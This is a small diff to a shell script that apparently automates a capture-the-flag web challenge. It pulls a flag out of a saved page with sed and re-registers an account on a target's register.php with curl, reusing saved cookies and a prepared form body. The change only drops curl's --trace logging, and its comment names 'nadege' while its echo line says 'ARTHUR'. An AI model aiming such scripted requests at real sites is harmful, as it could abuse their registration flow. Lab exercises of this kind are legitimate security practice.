@@ -37,4 +37,4 @@ echo "--> Flag is : $(sed -n ':a;N;$!ba;s/.*<p[^>]*>\(.*\)<\/p>.*/\1/p' /work/7-
 
 # Registering nadege a second time
 echo "4 - REGISTERING ARTHUR"
-curl -X POST "http://$target_ip:8088/register.php" -b /work/7-cookies.txt -v -L --trace trace-nadege.log -H "Content-Type: multipart/form-data; boundary=-----------------------------346104398912025331583998084524" --data-binary @${scriptpath}/7-data/nadege.txt
+curl -X POST "http://$target_ip:8088/register.php" -b /work/7-cookies.txt -v -L -H "Content-Type: multipart/form-data; boundary=-----------------------------346104398912025331583998084524" --data-binary @${scriptpath}/7-data/nadege.txt
